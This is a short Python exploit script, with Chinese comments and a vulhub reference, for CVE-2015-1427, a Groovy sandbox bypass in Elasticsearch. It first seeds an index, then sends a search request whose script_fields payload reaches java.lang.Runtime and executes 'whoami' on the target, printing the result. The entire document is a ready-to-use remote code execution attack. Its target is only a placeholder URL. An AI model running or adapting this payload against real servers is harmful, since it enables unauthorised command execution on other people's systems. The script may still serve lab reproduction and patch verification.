#@author Firbasky
#参考https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#解决ssl链接报错

"""
本漏洞：1.是一个沙盒绕过；2.是一个Goovy代码执行漏洞。
"""

url = "http://ip"

add = {
  "name": "Firebasky"
}

exp ={
    "size":1, "script_fields": 
    {   
        "lupin":
            {
                "lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"
            }
    }
}

add = json.dumps(add)
exp = json.dumps(exp)
headers = {"Content-type": "application/json","Accept": "*/*"}
#需要添加一条数据
requests.request("POST",url=url+"/website/blog/",data=add,verify=False,headers=headers)
#执行命令
r=requests.request("POST",url=url+"/_search?pretty",verify=False,data=exp,headers=headers)
print(r.text)
